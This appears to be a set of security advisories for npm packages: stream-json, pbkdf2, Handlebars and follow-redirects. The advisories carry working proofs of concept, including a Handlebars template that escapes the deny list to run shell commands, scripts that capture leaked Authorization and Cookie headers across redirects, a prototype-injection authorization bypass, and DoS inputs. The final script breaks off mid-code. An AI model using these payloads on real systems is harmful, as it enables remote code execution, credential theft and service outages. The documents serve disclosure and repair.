1241262.overview:
## Summary

The JSONC parser (`stream-json/jsonc/parser.js`) and verifier (`stream-json/jsonc/verifier.js`) scan a comment for its terminator starting from the comment's opening `/` on every input chunk. When a comment doesn't finish inside the current buffer, the scanner returns the comment's start offset and the buffer keeps the whole comment, so the next chunk re-scans everything seen so far. A single comment of length n delivered across many chunks costs O(n²) CPU.

This is the same class as GHSA-528h-pc64-c93x (path filters, medium, CWE-407): an algorithmic-complexity re-scan in a streaming feature. It's a different code path though — the comment scanner in `handleComment`, which the 3.5.0 depth cap doesn't touch — so upgrading past that advisory doesn't help here. The plain JSON parser is fine: its strings and numbers advance and drop consumed bytes, and only comments retain and re-scan.

## Proof of concept

```
npm i stream-json@3.5.0
```

```js
import Parser from 'stream-json/jsonc/parser.js';

function feed(N) {
  return new Promise(resolve => {
    const stream = Parser.asStream();            // default options
    stream.on('data', () => {});
    stream.on('error', () => {});
    stream.on('end', resolve);
    const doc = '/*' + 'a'.repeat(N) + '*/1';     // one valid, closed comment
    for (let i = 0; i < doc.length; i += 16384)   // 16 KB pieces, as a socket delivers a body
      stream.write(doc.slice(i, i + 16384));
    stream.end();
  });
}
```

Timing the pipeline (Node 22, one core, clean install): a 2 MB comment blocks the event loop ~0.9 s, 4 MB ~2.9 s, 8 MB ~13 s — roughly 4x per doubling, so quadratic. Smaller chunks make it worse, and the attacker controls TCP segment size: a fixed 4 MB comment takes ~0.75 s at 64 KB chunks, ~2.8 s at 16 KB, ~11 s at 4 KB. Feeding the same input to the JSONC verifier reproduces it identically.

## Impact

Remote, unauthenticated CPU denial of service against any service that runs untrusted input through the JSONC parser or verifier: one request pins a core and stalls the whole event loop.

## Caveat

Only the JSONC entry points are affected; an app on the default JSON parser is safe. The comment doesn't need to be malformed - a valid, properly closed comment does it. The payload is a few MB, or less if the client sends small chunks. I've suggested medium and left the CVSS vector to you.

---

# Maintainer note on scope

The attack vector is local — stream-json's documented input is data the user owns (JSONC is configuration you wrote); it is not designed for input from the open internet, and the docs now say so explicitly for JSONC. Comments now mirror chunked strings (`startComment` / `commentChunk` / `endComment`, packed `commentValue`); the scan resumes across input chunks, so a comment of any length costs linear time, and constant memory without packing.

1241263.overview:
### Summary
A prototype-pollution vulnerability in stream-json lets attacker-controlled JSON replace a parsed object's prototype.

### Details
The streaming JSON parser (StreamValues/StreamObject/jsonc variants) writes keys via plain assignment, so a __proto__ key replaces the parsed object's prototype with attacker-controlled content (verified 3.5.0 npm latest; native JSON.parse twin control stays clean). Parsing untrusted JSON is the contract. Assembler in Assembler.js.

### PoC

Run:
```bash
node poc-stream-json-proto-injection.mjs
```

Full proof-of-concept source (poc-stream-json-proto-injection.mjs):
```js
// stream-json v3.5.0 (npm latest) — local [[Prototype]] replacement via `__proto__` keys
// Class: prototype injection in a JSON deserializer (jsonparse/bser/jsonc-parser/plist family)
// Root cause: Assembler builds every object as a plain `Object` and writes
//   `this.current[this.key] = value` (src/core/assembler.js:160,180 — plain assignment,
//   ToPropertyKey → inherited Object.prototype __proto__ setter fires)
// Spec baseline: JSON.parse (CreateDataProperty) → own data property, no prototype change
// Run:  node poc-stream-json-proto-injection.mjs   (from C:/Users/rncb0/AppData/Local/Temp/0day/sj-lab)
import { parser } from 'stream-json';
import jsoncParser from 'stream-json/jsonc/Parser.js';
import { streamValues } from 'stream-json/streamers/stream-values.js';
import { streamObject } from 'stream-json/streamers/stream-object.js';
import { Readable } from 'node:stream';

const sv = (input, P = parser) => new Promise((res, rej) => {
  const vals = [];
  Readable.from([input]).pipe(P.asStream()).pipe(streamValues.asStream())
    .on('data', d => vals.push(d.value)).on('end', () => res(vals)).on('error', rej);
});
const so = (input) => new Promise((res, rej) => {
  const out = {};
  Readable.from([input]).pipe(parser.asStream()).pipe(streamObject.asStream())
    .on('data', d => { out[d.key] = d.value; }).on('end', () => res(out)).on('error', rej);
});

let pass = 0, fail = 0;
const check = (name, cond) => { if (cond) { pass++; console.log(`  PASS  ${name}`); } else { fail++; console.log(`  FAIL  ${name}`); } };

const INPUT = '{"__proto__":{"isAdmin":true,"role":"superuser"},"name":"bob","age":30}';
const baseline = JSON.parse(INPUT);
const sv1 = (await sv(INPUT))[0];
const so1 = await so(INPUT);
const jc1 = (await sv(INPUT, jsoncParser))[0];
const nested = (await sv('{"user":{"__proto__":{"isAdmin":true},"name":"alice"}}'))[0].user;
const arrProto = (await sv('{"__proto__":["isAdmin","role"],"name":"bob"}'))[0];
const prim = (await sv('{"__proto__":"x","name":"bob"}'))[0];
const ctor = (await sv('{"constructor":{"prototype":{"polluted":1}},"name":"bob"}'))[0];

console.log('== A. CORE VECTOR: __proto__ key → parsed object [[Prototype]] replaced (read-through injection) ==');
check('StreamValues: Object.keys hides __proto__/isAdmin (["name","age"])', JSON.stringify(Object.keys(sv1)) === '["name","age"]');
check('StreamValues: JSON.stringify hides injected props ({"name":"bob","age":30})', JSON.stringify(sv1) === '{"name":"bob","age":30}');
check('StreamValues: hasOwnProperty(isAdmin) === false (own-key allowlists pass)', !Object.prototype.hasOwnProperty.call(sv1, 'isAdmin'));
check('StreamValues: obj.isAdmin === true (INHERITED read-through)', sv1.isAdmin === true);
check('StreamValues: obj.role === "superuser"', sv1.role === 'superuser');
check('StreamValues: [[Prototype]] is NON-plain', Object.getPrototypeOf(sv1) !== Object.prototype);
check('StreamObject: same read-through (obj.isAdmin === true)', so1.isAdmin === true && Object.keys(so1).length === 2);
check('jsonc parser (comments variant): same read-through', jc1.isAdmin === true && JSON.stringify(Object.keys(jc1)) === '["name","age"]');
check('NESTED: user.isAdmin === true, own keys ["name"]', nested.isAdmin === true && JSON.stringify(Object.keys(nested)) === '["name"]');

console.log('== B. SPEC BASELINE (control): JSON.parse makes __proto__ an OWN data key ==');
check('JSON.parse: own __proto__ key visible', Object.keys(baseline).includes('__proto__'));
check('JSON.parse: isAdmin undefined (no read-through)', baseline.isAdmin === undefined);
check('JSON.parse: [[Prototype]] stays plain', Object.getPrototypeOf(baseline) === Object.prototype);

console.log('== C. VARIANT: array-valued __proto__ → parsed object becomes array-like ==');
check('proto is attacker Array (av[0]=="isAdmin", av[1]=="role")', arrProto[0] === 'isAdmin' && arrProto[1] === 'role');
check('legit data lands at attacker-indexed position (av[2]=="bob", length 3)', arrProto[2] === 'bob' && arrProto.length === 3);

console.log('== D. FAIL-CLOSED CONTROLS ==');
check('primitive __proto__ value: no-op, plain proto (spec semantics)', Object.getPrototypeOf(prim) === Object.prototype && Object.keys(prim).length === 1);
check('constructor key: harmless own prop', Object.prototype.hasOwnProperty.call(ctor, 'constructor') && ({}).polluted === undefined);
check('NO GLOBAL Object.prototype pollution', ({}).polluted === undefined && ({}).isAdmin === undefined);

console.log('== E. IMPACT: auth/flag decisions read attacker values; hardened-merge bypass ==');
const authorize = o => o.isAdmin === true && o.role === 'superuser';
check('authorize(stream-json obj) === true (GRANT)', authorize(sv1) === true);
check('authorize(JSON.parse twin) === false (DENY — control)', authorize(baseline) === false);
const target = { theme: 'light' };
for (const k in sv1) target[k] = sv1[k];        // typical naive/hardened merge (for-in)
check('merge copies INHERITED isAdmin as OWN prop onto target (skip-__proto__ sanitizer defeated)',
      Object.prototype.hasOwnProperty.call(target, 'isAdmin') && target.isAdmin === true);
const t2 = { theme: 'light' };
for (const k in baseline) t2[k] = baseline[k];   // JSON.parse twin stays clean
check('merge of JSON.parse twin has NO isAdmin (control)', !Object.prototype.hasOwnProperty.call(t2, 'isAdmin'));

console.log(`\nRESULT: ${pass} PASS / ${fail} FAIL`);
process.exit(fail ? 1 : 0);

```

Observed output (verbatim, Node 24.15.0, Windows):
```
RESULT: 21 PASS / 0 FAIL
```

### Impact
Prototype pollution (CWE-1321). Applications parsing attacker-influenced streaming JSON can have authorization checks read attacker-controlled values. Affects stream-json <= 3.5.0; no patched version exists.

---

# Maintainer note on scope

The attack vector is local — stream-json's documented input is data the user owns (database dumps, exports, logs); it is not designed for JSON from the open internet, and the docs now say so. The parsed object's prototype was replaced (never the global `Object.prototype`); `"__proto__": null` additionally strips `Object.prototype` from the parsed object, so ordinary consumer code calling `hasOwnProperty()` throws. `Assembler` and `FlexAssembler` now create an own data property for a `__proto__` key, exactly as `JSON.parse` does.

---

1241333.overview:
### Summary
This is the same bug as Django had (CVE-2013-1443).

### Details
A long password can cause a DoS because it is not using cached HMAC, length limits, or pre-hashing passwords longer than the block size of the hash function as per HMAC spec. This line of code hashes the full password each iteration: https://github.com/browserify/pbkdf2/blob/1c3b1f526b052a29b3b42120c9821895772df7e8/lib/sync.js#L60

Also see https://github.com/browserify/pbkdf2/issues/82

### PoC
The first key will take a lot longer to generate when not using the native code and uses code from `/lib/sync.js` (ie when this if statement is true):
https://github.com/browserify/pbkdf2/blob/1c3b1f526b052a29b3b42120c9821895772df7e8/index.js#L33-L37

```js
var pbkdf2 = require('pbkdf2');
var createHash = require('create-hash');
var pw = ".".repeat(1048576); // 1 MiB

var t0 = performance.now();
var key1 = pbkdf2.pbkdf2Sync(pw, "salt", 1000, 32, "sha256");
var t1 = performance.now();
pw = createHash('sha256').update(pw).digest(); // HMAC specification for keys larger than block size
var key2 = pbkdf2.pbkdf2Sync(pw, "salt", 1000, 32, "sha256");
var t2 = performance.now();

console.log("First took:  " + (t1 - t0));
console.log("Second took: " + (t2 - t1));
console.log("Generated keys:");
console.log(key1);
console.log(key2);
```

### Impact
DoS

1242173.overview:
## Summary

Handlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.

## Description

`lookupProperty` trusts own properties:

```js
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
  return result;
}
```

Normally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:

```js
Function.prototype.constructor === Function;
String.prototype.constructor === String;
Object.prototype.constructor === Object;
```

As a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.

## Proof of Concept

An attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:

1. Access a function's prototype: {{lookup myFunction "proto"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).
2. Access constructor via own property bypass: {{lookup (lookup myFunction "\_\_proto__") "constructor"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.
3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).

```javascript
const Handlebars = require('handlebars');

// constructor deny list bypass via hasOwnProperty check in lookupProperty
const template = Handlebars.compile(
    // construct code array from template string literal
    '{{#with a}}' +
      '{{lookup "" (push "return process.mainModule.require(\'child_process\').execSync(\'id\').toString()")}}' +
      '{{lookup "" (pop)}}' +
      '{{lookup "" (shift)}}' +
    '{{/with}}' +

    // access Function via own property bypass on Function.prototype.constructor
    '{{lookup "" (@root.a.push (lookup (lookup fn "__proto__") "constructor"))}}' +

    // #each sets depth0=Function without calling it, apply avoids hash body
    '{{#each @root}}{{#if @index}}{{else}}' +
      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +
    '{{/if}}{{/each}}'
);

const result = template(
    { fn: function(){}, a: [0] },
    { allowProtoMethodsByDefault: true }
);

console.log(result.trim());

// output: uid=1000(node) gid=1000(node) groups=1000(node)
```

## Workarounds

Do not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.

If you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.

1242604.overview:
### Summary
follow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared `sensitiveHeaders`) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with `for...in` and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying `http.request`, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, `for...in` yields the numeric indices `"0"`, `"1"`, `"2"` and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The `sensitiveHeaders` option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect.

### Details
The cross-origin credential-stripping control is implemented by `removeMatchingHeaders(regex, headers)` at `index.js:630-640`:

```js
function removeMatchingHeaders(regex, headers) {
  var lastValue;
  for (var header in headers) {          // for...in over an ARRAY yields "0","1","2"...
    if (regex.test(header)) {            // the header-name filter never matches a numeric index
      lastValue = headers[header];
      delete headers[header];
    }
  }
  return (lastValue === null || typeof lastValue === "undefined") ?
    undefined : String(lastValue).trim();
}
```

It is invoked from `_processResponse` for three purposes, all with the caller-supplied `this._options.headers`:

- `index.js:490` - strip the credential filter (`this._headerFilter`, which covers the built-in list Authorization/Proxy-Authorization/Cookie plus any `sensitiveHeaders`) when the redirect crosses origin or downgrades protocol.
- `index.js:470` - strip the `Host` header (`/^host$/i`).
- `index.js:466` - strip `content-*` headers when a 301/302/303 converts POST to GET.

The caller-supplied headers container is passed straight through to each redirected request via `nativeProtocol.request(this._options)` at `index.js:352`. `_sanitizeOptions` (index.js:300-331) only replaces `options.headers` when it is falsy, so an array is left untouched.

Node's `http.request` accepts `options.headers` as an alternating array of names and values (for example `["Authorization", "Bearer ...", "Cookie", "session=..."]`). This is a supported way to control header ordering and duplication. For such an array, `for (var header in headers)` iterates the numeric indices `"0"`, `"1"`, `"2"`, and the header-name regex never matches any of them, so `removeMatchingHeaders` deletes nothing. Every one of the three strip operations above silently no-ops:

- The built-in credential headers (Authorization, Cookie, Proxy-Authorization) are forwarded to the cross-origin redirect target.
- Any `sensitiveHeaders` the caller declared are forwarded too.
- The stale `Host` of the previous origin is re-sent to the new origin.
- On a POST-to-GET redirect the `content-*` headers are retained, leaving `Content-Length` inconsistent with the now-empty body.

The primary and highest-impact consequence is disclosure of credential headers. The stale `Host` re-send and the `Content-Length` inconsistency are secondary correctness defects arising from the same root cause.

Root-cause history: the `for...in`-based `removeMatchingHeaders` used for the built-in credential strip has been present since the cross-host Authorization drop was introduced (commit `724087d`, first released in v1.11.0) and is unchanged through 1.16.0. The `sensitiveHeaders` layer was introduced in 1.16.0 (commit `844c4d3`). The behavior was verified directly on both 1.15.11 and 1.16.0.

Suggested remediation: handle or explicitly reject Node's array-form headers. The strictest fix is to detect `Array.isArray(options.headers)` in `_sanitizeOptions` and throw a clear `TypeError` instructing callers to pass an object, so misuse fails loudly instead of silently downgrading security. If array support is desired, extend `removeMatchingHeaders` to walk the array in name/value pairs:

```js
function removeMatchingHeaders(regex, headers) {
  if (Array.isArray(headers)) {
    var lastValue;
    for (var i = 0; i < headers.length; i += 2) {
      if (regex.test(headers[i])) { lastValue = headers[i + 1]; headers.splice(i, 2); i -= 2; }
    }
    return (lastValue === null || typeof lastValue === "undefined") ? undefined : String(lastValue).trim();
  }
  // existing object logic
}
```

Apply the same guard to the `Host` and `content-*` removal paths. Add regression tests that exercise array-form headers across a cross-origin redirect; the current suite only covers object-form headers.

References:
- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653
- https://github.com/follow-redirects/follow-redirects/commit/724087d696c0bcd55c13ee0f3560c4558138e422
- https://github.com/follow-redirects/follow-redirects/commit/844c4d3 (sensitiveHeaders option)

### PoC
Environment: Node.js v24.18.0 on Windows 11. The underlying Node array-header behavior is long-standing and not version-specific. Run each script from a checkout of follow-redirects at 1.16.0 so that `require("./index.js")` resolves to the library under test.

Precondition check (Node accepts and serializes array-form headers):
```
node -e 'var http=require("http");var s=http.createServer((q,r)=>r.end(JSON.stringify(q.headers)));s.listen(0,"127.0.0.1",()=>{var p=s.address().port;http.request({hostname:"127.0.0.1",port:p,headers:["Authorization","Bearer T","Cookie","c=1"]},res=>{var b="";res.on("data",c=>b+=c);res.on("end",()=>{console.log(JSON.parse(b).authorization, JSON.parse(b).cookie);s.close();});}).end();});'
```
Observed: `Bearer T c=1` (the server receives both headers, confirming array form is valid and delivered).

Minimal form (built-in credential list), `arrayleak.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  req.resume();
  res.writeHead(302, { Location: "http://127.0.0.1:47302/steal" });   // cross-origin (different port)
  res.end();
});
var collector = http.createServer(function (req, res) {
  res.end(JSON.stringify(req.headers));                                // attacker-controlled target
});
redirector.listen(47301, "127.0.0.1", function () {
  collector.listen(47302, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 47301, path: "/", method: "GET",
      headers: [
        "Host", "127.0.0.1:47301",
        "Authorization", "Bearer ARRAY-FORM-VICTIM-TOKEN",
        "Cookie", "session=ARRAY-FORM-SESSION-ID",
        "X-Custom", "harmless"
      ]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; });
      res.on("end", function () {
        var h = JSON.parse(body);
        console.log("Authorization :", h.authorization || "(stripped - OK)");
        console.log("Cookie        :", h.cookie || "(stripped - OK)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0 and 1.15.11):
```
Authorization : Bearer ARRAY-FORM-VICTIM-TOKEN     <- credential LEAKED cross-origin
Cookie        : session=ARRAY-FORM-SESSION-ID      <- credential LEAKED cross-origin
```
Control: replacing `headers` with the equivalent object `{ Host: ..., Authorization: ..., Cookie: ... }` and re-running strips both correctly, proving the strip branch executes and only the array iteration defeats it.

Combined form (built-in list plus the 1.16.0 `sensitiveHeaders` fix, all defeated in one request), `combined.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  req.resume();
  res.writeHead(302, { Location: "http://127.0.0.1:47402/steal" });
  res.end();
});
var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });
redirector.listen(47401, "127.0.0.1", function () {
  collector.listen(47402, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 47401, path: "/", method: "GET",
      headers: [
        "Host", "127.0.0.1:47401",
        "Authorization", "Bearer BUILTIN-VICTIM-TOKEN",
        "Cookie", "session=BUILTIN-SESSION-ID",
        "X-API-Key", "DECLARED-VICTIM-KEY"
      ],
      sensitiveHeaders: ["X-API-Key"]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; }); res.on("end", function () {
        var h = JSON.parse(body);
        console.log("Authorization (built-in list) :", h.authorization || "(stripped - OK)");
        console.log("Cookie (built-in list)        :", h.cookie || "(stripped - OK)");
        console.log("X-API-Key (sensitiveHeaders)  :", h["x-api-key"] || "(stripped - OK)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0):
```
Authorization (built-in list) : Bearer BUILTIN-VICTIM-TOKEN     <- LEAKED
Cookie (built-in list)        : session=BUILTIN-SESSION-ID      <- LEAKED
X-API-Key (sensitiveHeaders)  : DECLARED-VICTIM-KEY             <- LEAKED (the CVE-2026-40895 fix defeated)
```

Protocol-downgrade branch (credentials transit in cleartext), `downgrade.js`, using the repository's own test certificate at `test/assets/`:
```js
var followRedirects = require("./index.js");
var http = require("http"); var https = require("https"); var fs = require("fs");
var opts = { key: fs.readFileSync("test/assets/localhost.key"), cert: fs.readFileSync("test/assets/localhost.crt") };
var ca = fs.readFileSync("test/assets/ca.crt");
var httpsOrigin = https.createServer(opts, function (req, res) {
  req.resume(); res.writeHead(302, { Location: "http://localhost:47502/steal" }); res.end();
});
var httpCollector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });
httpsOrigin.listen(47501, "localhost", function () {
  httpCollector.listen(47502, "localhost", function () {
    followRedirects.https.request({
      hostname: "localhost", port: 47501, path: "/", method: "GET", ca: ca,
      headers: ["Host", "localhost:47501", "Authorization", "Bearer DOWNGRADE-TOKEN", "Cookie", "session=DOWNGRADE-SESSION"]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; });
      res.on("end", function () {
        var h = JSON.parse(body);
        console.log("Authorization :", h.authorization || "(stripped - OK)");
        console.log("Cookie        :", h.cookie || "(stripped - OK)");
        httpsOrigin.close(); httpCollector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0): both credentials received at the plaintext HTTP target after an HTTPS-to-HTTP redirect, meaning they transit unencrypted and are harvestable by any on-path network observer, not only the redirect destination.

Side-effect verification (stale Host re-sent, Content-Length inconsistent): a POST request with array-form headers and a 13-byte body that receives a 302 to a different origin was observed to arrive at the new origin as a GET carrying the stale `Host` of the first origin and `Content-Length: 13` despite an empty body.

### Impact
This is an information-disclosure vulnerability: silent failure of the cross-origin credential-header stripping control. Who is impacted: any application, or upstream library, that calls follow-redirects with Node's array-form headers (used to control header ordering or duplication) and follows a redirect whose target is controlled or compromised by an attacker. When triggered, the victim's Authorization, Cookie, and Proxy-Authorization headers, and any headers declared through the `sensitiveHeaders` option, are disclosed to the attacker-controlled destination. In the protocol-downgrade case the credentials additionally traverse the network in cleartext, exposing them to on-path observers. No authentication or user interaction is required of the attacker beyond controlling a redirect target the victim already contacts. The control that is defeated is the same one that prior advisories in this library (CVE-2022-0155, CVE-2022-0536, CVE-2026-40895 / GHSA-r4q5-vmmm-2653) were issued to establish and harden.

1242605.overview:
### Summary
follow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.

### Details
The filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:

```js
this._headerFilter = new RegExp("^(?:" +
    sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join("|") +
  ")$", "i");
```

`escapeRegex` at `index.js:703-705`:

```js
function escapeRegex(regex) {
  return regex.replace(/[\]\\/()*+?.$]/g, "\\$&");   // escapes ] \ / ( ) * + ? . $  -- NOT ^ | [ { }
}
```

The character class escapes `]`, `\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.

For a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:

- A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test("X-Api^Key")` returns `false`, and the header is not stripped.
- A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.

The generated filter source, reproduced from the exact library logic, is:
```
^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$
```
Direct matching results against this filter: `X-Api^Key` -> false, `X-Token|Secret` -> false, `X-Control-Key` (normal name) -> true, and the split-off `X-Token` -> true and `Secret` -> true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -> true.

Secondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.

Suggested remediation: two changes close both facets.

1. Escape the complete set of regular-expression metacharacters:
```js
function escapeRegex(str) { return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }
```
This was verified to restore correct matching for all affected names while preserving the built-in matches.

2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.

Additionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.

References:
- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653
- https://github.com/follow-redirects/follow-redirects/pull/284
- https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9

### PoC
Environment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require("./index.js")` resolves to the library under test.

Facet 1, metacharacter header names, `leak.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  req.resume();
  res.writeHead(302, { Location: "http://127.0.0.1:45902/" });   // cross-origin (different port)
  res.end();
});
var collector = http.createServer(function (req, res) {
  res.end(JSON.stringify(req.headers));                          // attacker-controlled target
});
redirector.listen(45901, "127.0.0.1", function () {
  collector.listen(45902, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 45901, path: "/",
      headers: {
        "X-Api^Key":      "SECRET-LEAKED-1",     // declared sensitive, name contains ^
        "X-Token|Secret": "SECRET-LEAKED-2",     // declared sensitive, name contains |
        "X-Control-Key":  "SHOULD-BE-STRIPPED",  // declared sensitive, normal name (control)
        "Authorization":  "Bearer BUILTIN-CTL"   // built-in list (control)
      },
      sensitiveHeaders: ["X-Api^Key", "X-Token|Secret", "X-Control-Key"]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; });
      res.on("end", function () {
        var h = JSON.parse(body);
        console.log("X-Api^Key      :", h["x-api^key"] || "(stripped)");
        console.log("X-Token|Secret :", h["x-token|secret"] || "(stripped)");
        console.log("X-Control-Key  :", h["x-control-key"] || "(stripped - OK)");
        console.log("Authorization  :", h["authorization"] || "(stripped - OK)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0):
```
X-Api^Key      : SECRET-LEAKED-1          <- credential LEAKED to redirect target
X-Token|Secret : SECRET-LEAKED-2          <- credential LEAKED to redirect target
X-Control-Key  : (stripped - OK)          <- control: option works for normal names
Authorization  : (stripped - OK)          <- control: built-in list works
```
The two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.

Root-cause and fix verification (pure regex logic, no network):
```js
var builtin = ["Authorization", "Proxy-Authorization", "Cookie"];
function escCurrent(s) { return s.replace(/[\]\\/()*+?.$]/g, "\\$&"); }         // library's escaper
function escFixed(s)   { return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }      // canonical escaper
function build(esc, d) { return new RegExp("^(?:" + builtin.concat(d).map(esc).join("|") + ")$", "i"); }
var declared = ["X-Api^Key", "X-Token|Secret", "X-Control-Key"];
var cur = build(escCurrent, declared), fix = build(escFixed, declared);
["X-Api^Key","X-Token|Secret"].forEach(n => console.log("current", n, cur.test(n)));  // both false
["X-Api^Key","X-Token|Secret"].forEach(n => console.log("fixed  ", n, fix.test(n)));  // both true
["X-Token","Secret"].forEach(n => console.log("collateral", n, cur.test(n)));         // both true (wrong)
```
Observed: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still true for the built-ins.

Reachability of the vectors:
```
node -e 'var http=require("http");["X-A^B","X-A|B","X-A[B","X-A{B","X-A}B"].forEach(function(n){try{var r=http.request({host:"127.0.0.1",port:1});r.setHeader(n,"v");r.destroy();console.log(n,"ACCEPTED");}catch(e){console.log(n,"REJECTED",e.code);}});'
```
Observed: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.

Facet 2, entry declared inside `beforeRedirect`, `leak2.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  res.writeHead(302, { Location: "http://127.0.0.1:46202/" }); res.end();
});
var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });
